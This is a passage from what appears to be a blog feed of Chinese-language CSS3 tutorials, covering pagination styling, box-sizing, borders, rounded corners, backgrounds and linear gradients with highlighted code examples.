class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>; <span class="hljs-comment">/* Gray */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-6-圆角边框"><a href="#9-6-圆角边框" class="headerlink" title="9.6 圆角边框"></a>9.6 圆角边框</h3><p>在第一个分页链接和最后一个分页链接添加圆角。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:first</span>-child <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">5px</span>;<br>    <span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">5px</span>;<br>    <span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-7-分页间隔"><a href="#9-7-分页间隔" class="headerlink" title="9.7 分页间隔"></a>9.7 分页间隔</h3><p>使用 margin 属性来为每个页码直接添加空格。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span>; <span class="hljs-comment">/* 0 is for top and bottom. Feel free to change it */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-8-分页字体大小"><a href="#9-8-分页字体大小" class="headerlink" title="9.8 分页字体大小"></a>9.8 分页字体大小</h3><p>使用 font-size 属性来设置分页的字体大小。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">22px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-9-居中分页"><a href="#9-9-居中分页" class="headerlink" title="9.9 居中分页"></a>9.9 居中分页</h3><p>在容器元素上 (如 div ) 添加 text-align:center 样式。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.center</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="10-框大小"><a href="#10-框大小" class="headerlink" title="10.框大小"></a>10.框大小</h2><p>box-sizing 属性可以设置 width 和 height 属性中包含了 padding(内边距) 和 border(边框)。</p><h3 id="10-1-不使用-CSS3-box-sizing-属性"><a href="#10-1-不使用-CSS3-box-sizing-属性" class="headerlink" title="10.1 不使用 CSS3 box-sizing 属性"></a>10.1 不使用 CSS3 box-sizing 属性</h3><p>默认情况下，元素的宽度与高度计算方式如下：<br>width(宽) + padding(内边距) + border(边框) = 元素实际宽度<br>height(高) + padding(内边距) + border(边框) = 元素实际高度</p><p>这就意味着我们在设置元素的 width/height 时，元素真实展示的高度与宽度会更大(因为元素的边框与内边距也会计算在 width/height 中)。</p><p>这个是个较小的框 (width 为 300px ，height 为 100px)。<br>这个是个较大的框 (width 为 300px ，height 为 100px)。<br>以上两个 div 元素虽然宽度与高度设置一样，但真实展示的大小不一致，因为 div2 指定了内边距。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.div1</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">height</span>:<span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid blue;<br>&#125;<br><br><span class="hljs-selector-class">.div2</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>   <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">50px</span>;<br>   <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid red;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用这种方式如果想要获得较小的那个框且包含内边距，就需要考虑到边框和内边距的宽度。CSS3 的 box-sizing 属性很好的解决了这个问题。</p><h3 id="10-2-使用-CSS3-box-sizing-属性"><a href="#10-2-使用-CSS3-box-sizing-属性" class="headerlink" title="10.2 使用 CSS3 box-sizing 属性"></a>10.2 使用 CSS3 box-sizing 属性</h3><p>CSS3 box-sizing 属性在一个元素的 width 和 height 中包含 padding(内边距) 和 border(边框)。如果在元素上设置了 box-sizing: border-box; 则 padding(内边距) 和 border(边框) 也包含在 width 和 height 中。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.div1</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">height</span>:<span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid blue;<br>   <span class="hljs-attribute">box-sizing</span>: border-box;<br>&#125;<br><br><span class="hljs-selector-class">.div2</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>   <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">50px</span>;<br>   <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid red;<br>    <span class="hljs-attribute">box-sizing</span>: border-box;<br>&#125;<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS3基础知识复习（一）</title>
    <link href="/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS3 是最新的 CSS 标准。使用了层叠样式表技术，可以对网页布局、字体、颜色、背景灯效果做出控制。css3作为css的进阶版，拆分和增加了盒子模型、列表模块、语言模块 、背景边框 、文字特效 、多栏布局等等。CSS3的改变有很多，增加了文字特效，丰富了下划线样式，加入了圈重点的功能。在边框方面，有了更多的灵活性，可以更加轻松地操控渐变效果和动态效果等等。在文字效果方面，特意增加了投影。</p><p>CSS3在兼容上做了很大的功夫，并且网络浏览器也还将继续支持CSS2，因此原来的代码不需要做太多的改变，只会变得更加地轻松。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-边框"><a href="#1-边框" class="headerlink" title="1.边框"></a>1.边框</h2><p>用CSS3，可以创建圆角边框，添加阴影框，并作为边界的形象而不使用设计程序（如Photoshop等作图软件），极大地节省了很多时间。</p><p>对于 border-image，Safari 5 以及更老的版本需要前缀 -webkit-。<br>Opera 支持 border-radius 和 box-shadow 属性，但是对于 border-image 需要前缀 -o-。</p><p>边框属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">border-image</td><td align="center">设置所有边框图像的速记属性。</td><td align="center">3</td></tr><tr><td align="center">border-radius</td><td align="center">一个用于设置所有四个边框- *-半径属性的速记属性</td><td align="center">3</td></tr><tr><td align="center">box-shadow</td><td align="center">附加一个或多个下拉框的阴影</td><td align="center">3</td></tr></tbody></table><h3 id="1-1-圆角（border-radius）"><a href="#1-1-圆角（border-radius）" class="headerlink" title="1.1 圆角（border-radius）"></a>1.1 圆角（border-radius）</h3><p>在CSS3中border-radius属性就是被用于创建圆角的。</p><p>使用实例：在 div 中添加圆角元素</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">border</span>:<span class="hljs-number">2px</span> solid;<br><span class="hljs-attribute">border-radius</span>:<span class="hljs-number">25px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-盒阴影（box-shadow）"><a href="#1-2-盒阴影（box-shadow）" class="headerlink" title="1.2 盒阴影（box-shadow）"></a>1.2 盒阴影（box-shadow）</h3><p>CSS3中的 box-shadow 属性被用来添加阴影。</p><p>使用实例：在 div 中添加 box-shadow 属性</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">10px</span> <span class="hljs-number">10px</span> <span class="hljs-number">5px</span> <span class="hljs-number">#888888</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-边界图片（border-image）"><a href="#1-3-边界图片（border-image）" class="headerlink" title="1.3 边界图片（border-image）"></a>1.3 边界图片（border-image）</h3><p>CSS3的 border-image 属性，可以使用图像创建一个边框。border-image属性允许指定一个图片作为边框！用于创建上文边框的原始图像。</p><p>使用实例：在 div 中使用图片创建边框</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">border-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">border.png</span>) <span class="hljs-number">30</span> <span class="hljs-number">30</span> round;<br>-webkit-<span class="hljs-attribute">border-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">border.png</span>) <span class="hljs-number">30</span> <span class="hljs-number">30</span> round; <span class="hljs-comment">/* Safari 5 and older */</span><br>-o-<span class="hljs-attribute">border-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">border.png</span>) <span class="hljs-number">30</span> <span class="hljs-number">30</span> round; <span class="hljs-comment">/* Opera */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-圆角（border-radius）"><a href="#2-圆角（border-radius）" class="headerlink" title="2.圆角（border-radius）"></a>2.圆角（border-radius）</h2><p>使用 CSS3 border-radius 属性，可以给任何元素制作 “圆角”。<br>圆角属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">border-radius</td><td align="center">所有四个边角 border-<em>-</em>-radius 属性的缩写</td></tr><tr><td align="center">border-top-left-radius</td><td align="center">定义了左上角的弧度</td></tr><tr><td align="center">border-top-right-radius</td><td align="center">定义了右上角的弧度</td></tr><tr><td align="center">border-bottom-right-radius</td><td align="center">定义了右下角的弧度</td></tr><tr><td align="center">border-bottom-left-radius</td><td align="center">定义了左下角的弧度</td></tr></tbody></table><h3 id="2-1-border-radius-属性"><a href="#2-1-border-radius-属性" class="headerlink" title="2.1 border-radius 属性"></a>2.1 border-radius 属性</h3><p>使用 CSS3 border-radius 属性，可以给任何元素制作 “圆角”。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/*第一种*/</span><br><span class="hljs-selector-id">#rcorners1</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-number">#8AC007</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;<br>&#125;<br><span class="hljs-comment">/*第二种*/</span><br><span class="hljs-selector-id">#rcorners2</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#8AC007</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;<br>&#125;<br><span class="hljs-comment">/*第三种*/</span><br><span class="hljs-selector-id">#rcorners3</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">/statics/images/course/paper.gif</span>);<br>    <span class="hljs-attribute">background-position</span>: left top;<br>    <span class="hljs-attribute">background-repeat</span>: repeat;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>border-radius 属性有四种实现方式：</p><blockquote><ul><li>四个值: 第一个值为左上角，第二个值为右上角，第三个值为右下角，第四个值为左下角。</li><li>三个值: 第一个值为左上角, 第二个值为右上角和左下角，第三个值为右下角</li><li>两个值: 第一个值为左上角与右下角，第二个值为右上角与左下角</li><li>一个值： 四个圆角值相同</li></ul></blockquote><h2 id="3-背景"><a href="#3-背景" class="headerlink" title="3.背景"></a>3.背景</h2><p>背景属性：</p><table><thead><tr><th align="center">顺序</th><th align="center">描述</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">background-clip</td><td align="center">规定背景的绘制区域。</td><td align="center">3</td></tr><tr><td align="center">background-origin</td><td align="center">规定背景图片的定位区域。</td><td align="center">3</td></tr><tr><td align="center">background-size</td><td align="center">规定背景图片的尺寸。</td><td align="center">3</td></tr><tr><td align="center">background-image</td><td align="center">添加背景图片。</td><td align="center">3</td></tr></tbody></table><h3 id="3-1-background-image属性"><a href="#3-1-background-image属性" class="headerlink" title="3.1 background-image属性"></a>3.1 background-image属性</h3><p>通过background-image属性添加背景图片。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#example1</span> &#123;<br><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">paper.gif</span>);<br><span class="hljs-attribute">background-position</span>: right bottom, left top;<br><span class="hljs-attribute">background-repeat</span>: no-repeat, repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>给不同的图片设置多个不同的属性</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#example1</span> &#123;<br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>) right bottom no-repeat, <span class="hljs-built_in">url</span>(<span class="hljs-string">paper.gif</span>) left top repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-background-size-属性"><a href="#3-2-background-size-属性" class="headerlink" title="3.2 background-size 属性"></a>3.2 background-size 属性</h3><p>background-size指定背景图像的大小。<br>CSS3中可以指定背景图片，重新在不同的环境中指定背景图片的大小。可以指定像素或百分比大小。指定的大小是相对于父元素的宽度和高度的百分比的大小。</p><p>使用实例：重置背景图像</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>);<br><span class="hljs-attribute">background-size</span>:<span class="hljs-number">80px</span> <span class="hljs-number">60px</span>;<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用实例：伸展背景图像完全填充内容区域</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>);<br><span class="hljs-attribute">background-size</span>:<span class="hljs-number">100%</span> <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-background-Origin属性"><a href="#3-3-background-Origin属性" class="headerlink" title="3.3 background-Origin属性"></a>3.3 background-Origin属性</h3><p>background-Origin属性指定了背景图像的位置区域。content-box, padding-box,和 border-box区域内可以放置背景图像。</p><p><img src="https://img-blog.csdnimg.cn/20210514134218619.gif"></p><p>使用实例：在 content-box 中定位背景图片</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>);<br><span class="hljs-attribute">background-repeat</span>:no-repeat;<br><span class="hljs-attribute">background-size</span>:<span class="hljs-number">100%</span> <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">background-origin</span>:content-box;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-4-多个背景图像"><a href="#3-4-多个背景图像" class="headerlink" title="3.4 多个背景图像"></a>3.4 多个背景图像</h3><p>CSS3 允许在元素中添加多个背景图像。</p><p>使用实例：在 body 元素中设置两个背景图像</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br><span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">img_flwr.gif</span>),<span class="hljs-built_in">url</span>(<span class="hljs-string">img_tree.gif</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-5-background-clip属性"><a href="#3-5-background-clip属性" class="headerlink" title="3.5 background-clip属性"></a>3.5 background-clip属性</h3><p>CSS3中 background-clip 背景剪裁属性是从指定位置开始绘制。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#example1</span> &#123;<br><span class="hljs-attribute">border</span>: <span class="hljs-number">10px</span> dotted black;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">35px</span>;<br><span class="hljs-attribute">background</span>: yellow;<br><span class="hljs-attribute">background-clip</span>: content-box;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4-渐变（Gradients）"><a href="#4-渐变（Gradients）" class="headerlink" title="4.渐变（Gradients）"></a>4.渐变（Gradients）</h2><p>CSS3 渐变（gradients）可以让在两个或多个指定的颜色之间显示平稳的过渡。<br>通过使用 CSS3 渐变（gradients），可以减少下载的事件和宽带的使用。此外，渐变效果的元素在放大时看起来效果更好，因为渐变（gradient）是由浏览器生成的。</p><p>CSS3 定义了两种类型的渐变：</p><ul><li>线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向</li><li>径向渐变（Radial Gradients）- 由它们的中心定义</li></ul><h3 id="4-1-线性渐变"><a href="#4-1-线性渐变" class="headerlink" title="4.1 线性渐变"></a>4.1 线性渐变</h3><p>为了创建一个线性渐变，必须至少定义两种颜色结点。颜色结点即想要呈现平稳过渡的颜色。同时，也可以设置一个起点和一个方向（或一个角度）。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(direction, color-stop1, color-stop2, ...);   <br></code></pre></div></td></tr></table></figure><h4 id="4-1-1-从上到下（默认情况）"><a href="#4-1-1-从上到下（默认情况）" class="headerlink" title="4.1.1 从上到下（默认情况）"></a>4.1.1 从上到下（默认情况）</h4><p>使用实例：从顶部开始的线性渐变。起点是红色，慢慢过渡到蓝色.</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(red, blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(red, blue); <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(red, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(red, blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-1-2-从左到右"><a href="#4-1-2-从左到右" class="headerlink" title="4.1.2 从左到右"></a>4.1.2 从左到右</h4><p>使用实例：从左边开始的线性渐变。起点是红色，慢慢过渡到蓝色.</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(left, red , blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(right, red, blue); <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(right, red, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, red , blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-1-3-对角"><a href="#4-1-3-对角" class="headerlink" title="4.1.3 对角"></a>4.1.3 对角</h4><p>可以通过指定水平和垂直的起始位置来制作一个对角渐变。</p><p>使用实例：从左上角开始（到右下角）的线性渐变。起点是红色，慢慢过渡到蓝色.</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(left top, red , blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(bottom right, red, blue); <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(bottom right, red, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom right, red , blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-使用角度"><a href="#4-2-使用角度" class="headerlink" title="4.2 使用角度"></a>4.2 使用角度</h3><p>如果想要在渐变的方向上做更多的控制，可以定义一个角度，而不用预定义方向（to bottom、to top、to right、to left、to bottom right，等等）。角度是指水平线和渐变线之间的角度，逆时针方向计算。换句话说，0deg 将创建一个从下到上的渐变，90deg 将创建一个从左到右的渐变。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(angle, color-stop1, color-stop2);  <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210514162621682.jpg"></p><p>但是，请注意很多浏览器(Chrome,Safari,fiefox等)的使用了旧的标准，即 0deg 将创建一个从下到上的渐变，90deg 将创建一个从左到右的渐变。<br>换算公式 90 - x = y 其中 x 为标准角度，y为非标准角度。</p><p>使用实例：带有指定的角度的线性渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(<span class="hljs-number">180deg</span>, red, blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(<span 